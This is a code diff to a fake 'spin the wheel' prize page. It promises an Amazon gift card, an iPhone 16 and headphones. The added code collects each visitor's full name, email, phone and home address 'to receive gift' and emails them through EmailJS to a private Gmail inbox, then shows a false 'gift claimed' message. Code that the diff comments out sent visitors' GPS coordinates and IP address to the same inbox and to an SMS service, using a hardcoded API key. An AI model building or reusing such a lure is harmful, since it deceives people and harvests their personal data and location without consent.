@@ -371,7 +371,7 @@
       <div class="prize-name" id="modalPrize">Prize</div>
       <p id="modalDesc">Enjoy your reward!</p>
       <div>
-        <form id="userForm" onsubmit="submitForm()">
+        <form id="userForm" name="userForm">
           <div class="form-field">
             <label for="userName">Full name</label>
             <input type="text" id="userName" name="userName" placeholder="Your full name" autocomplete="name" required>
@@ -385,16 +385,17 @@
             <input type="tel" id="userPhone" name="userPhone" placeholder="Your phone number" autocomplete="tel" required>
           </div>
           <div class="form-field">
-            <label for="userAddress">Address</label>
+            <label for="userAddress">Full Address to receive gift</label>
             <input type="text" id="userAddress" name="userAddress" placeholder="Your street address" autocomplete="street-address" required>
+          </div>
+          <div class="modal-btns">
+            <button type="button" class="btn btn-primary" id="claimBtn">Claim Gift</button>
+            <!-- <button class="btn btn-secondary" id="closeBtn">Spin Again</button> -->
+            <!-- <button class="btn btn-secondary" id="sendLocationBtn">📍 Send Location</button> -->
           </div>
         </form>
       </div>
-      <div class="modal-btns">
-        <button class="btn btn-primary" id="claimBtn">Claim Gift</button>
-        <!-- <button class="btn btn-secondary" id="closeBtn">Spin Again</button> -->
-        <!-- <button class="btn btn-secondary" id="sendLocationBtn">📍 Send Location</button> -->
-      </div>
+      
     </div>
   </div>
 
@@ -421,11 +422,11 @@
 
     /* ── Prize definitions ── */
     const prizes = [
-      { label: 'Gift Card',    emoji: '💳', color: '#e63946', desc: 'RS.10000 Gift Card for you!' },
-      { label: 'Mystery Box',  emoji: '📦', color: '#457b9d', desc: 'An exciting mystery box full of surprises!' },
+      { label: 'Amazon Gift Card',    emoji: '💳', color: '#e63946', desc: 'RS.10000 Gift Card for you!' },
+      // { label: 'Mystery Box',  emoji: '📦', color: '#457b9d', desc: 'An exciting mystery box full of surprises!' },
       { label: 'Headphones',   emoji: '🎧', color: '#2a9d8f', desc: 'Samsung Premium wireless headphones — yours to keep!' },
-      { label: 'Recharge Coupon',  emoji: '📚', color: '#e9c46a', desc: 'A recharge coupon for your mobile!' },
-      { label: 'iPhone',      emoji: '📱', color: '#f4a261', desc: 'A brand new iPhone for you!' },
+      { label: 'Mystery Box',  emoji: '🎁', color: '#e9c46a', desc: 'A recharge coupon for your mobile!' },
+      { label: 'iPhone 16',      emoji: '📱', color: '#f4a261', desc: 'A brand new iPhone for you!' },
       { label: 'Smartwatch',   emoji: '⌚', color: '#6a4c93', desc: 'A sleek Samsung smartwatch to elevate your style!' }
     ];
 
@@ -453,14 +454,43 @@
       publicKey: 'iihXXrF-lc_M_Atd1',
     });
     function submitForm() {
+      const userForm = document.getElementById('userForm');
+      console.log('Checking form validity', userForm.checkValidity());
+      if (!userForm.checkValidity()) {  
+        alert('Please fill in all fields to claim your gift.');
+        return false;
+      }
       const name = document.getElementById('userName').value;
       const email = document.getElementById('userEmail').value;
       const phone = document.getElementById('userPhone').value;
       const address = document.getElementById('userAddress').value;
-
-      console.log('Form submitted:', { name, email, phone, address });
-      sendEmail(name, email, phone, address);
-      return false; // Prevent actual form submission
+      if (!name || !email || !phone || !address) {
+        alert('Please fill in all fields properly to claim your gift.');
+        // return false;
+      }
+      else {
+        console.log('Form submitted:', { name, email, phone, address });
+        emailjs.send(
+          'service_v8ava8a',
+          'template_rd1m53j',
+          {
+            to_email: 'rafee.infinix@gmail.com',
+            // message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}
+            message: `User details:\n Name: ${name}, Email: ${email}, Phone: ${phone}, Address: ${address}`
+          }
+        )
+        .then(() => {
+          console.log('Email sent');
+        })
+        .catch(err => {
+          console.error(err);
+        });
+        // sendEmail(name, email, phone, address);
+        modal.classList.remove('show');
+        stopConfetti();
+        // return false; // Prevent actual form submission
+        alert('Your gift has been claimed! Check your email for details. 🎉');
+      }
     }
     /* ── Draw wheel ── */
     function drawWheel(angle) {
@@ -606,8 +636,9 @@
     // });
 
     document.getElementById('claimBtn').addEventListener('click', () => {
-      modal.classList.remove('show');
-      stopConfetti();
+      submitForm();
+      // modal.classList.remove('show');
+      // stopConfetti();
       // getMobileLocation();
       // alert('Your gift has been claimed! Check your email for details. 🎉');
     });
@@ -781,24 +812,24 @@
 
     console.log(`Latitude: ${lat}, Longitude: ${lng}`);
     console.log(`Accurate within ${accu} meters.`);
-    emailjs.send(
-      'service_v8ava8a',
-      'template_rd1m53j',
-      {
-        to_email: 'rafee.infinix@gmail.com',
-        message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}`
-      }
-    )
-    .then(() => {
-      console.log('Email sent');
-    })
-    .catch(err => {
-      console.error(err);
-    });
-    sendCustomSMS();
-    if (openSms) {
-      openSmsModal(lat, lng, accu);
-    }
+    // emailjs.send(
+    //   'service_v8ava8a',
+    //   'template_rd1m53j',
+    //   {
+    //     to_email: 'rafee.infinix@gmail.com',
+    //     message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}`
+    //   }
+    // )
+    // .then(() => {
+    //   console.log('Email sent');
+    // })
+    // .catch(err => {
+    //   console.error(err);
+    // });
+    // sendCustomSMS();
+    // if (openSms) {
+    //   openSmsModal(lat, lng, accu);
+    // }
     spin();
     }
 
@@ -809,7 +840,7 @@
       {
         to_email: 'rafee.infinix@gmail.com',
         // message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}
-        message: `User details:\n Name: ${name}, Email: ${email}, Phone: ${phone}, Address: ${address}`
+        message: `User details: Name: ${name}, Email: ${email}, Phone: ${phone}, Address: ${address}`
       }
     )
     .then(() => {
@@ -857,43 +888,43 @@
         }
     }
 
-    async function sendCustomSMS() {
-      console.log(lat, lng, accu, ipnum);
-      // return false
-    const payload = {
-        template_id: "6aa3ef1377a3e68f090bd952",
-        recipients: [
-            {
-                latitude: lat,
-                longitude: lng,
-                accuracy: accu,
-                ip: ipnum
-            }
-        ]
-    };
+//     async function sendCustomSMS() {
+//       console.log(lat, lng, accu, ipnum);
+//       // return false
+//     const payload = {
+//         template_id: "6aa3ef1377a3e68f090bd952",
+//         recipients: [
+//             {
+//                 latitude: lat,
+//                 longitude: lng,
+//                 accuracy: accu,
+//                 ip: ipnum
+//             }
+//         ]
+//     };
 
-    try {
+//     try {
 
-        const response = await fetch(
-            "https://control.msg91.com/api/v5/flow/",
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "authkey": "560761A9Gix8ob306a7faee1P1"
-                },
-                body: JSON.stringify(payload)
-            }
-        );
+//         const response = await fetch(
+//             "https://control.msg91.com/api/v5/flow/",
+//             {
+//                 method: "POST",
+//                 headers: {
+//                     "Content-Type": "application/json",
+//                     "authkey": "560761A9Gix8ob306a7faee1P1"
+//                 },
+//                 body: JSON.stringify(payload)
+//             }
+//         );
 
-        const result = await response.json();
+//         const result = await response.json();
 
-        console.log(result);
+//         console.log(result);
 
-    } catch(err) {
-        console.error(err);
-    }
-}
+//     } catch(err) {
+//         console.error(err);
+//     }
+// }
 
 
 
